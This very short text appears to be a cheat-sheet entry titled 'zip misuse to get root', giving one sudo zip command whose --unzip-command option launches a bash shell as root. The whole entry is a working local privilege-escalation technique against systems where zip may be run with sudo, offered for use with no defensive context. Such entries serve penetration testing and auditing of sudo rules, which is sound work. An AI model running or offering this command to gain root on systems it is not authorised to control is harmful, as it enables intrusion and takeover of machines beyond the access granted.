zip misuse to get root
sudo zip /tmp/exploit.zip /tmp/dummy -T --unzip-command="sh -c /bin/bash"
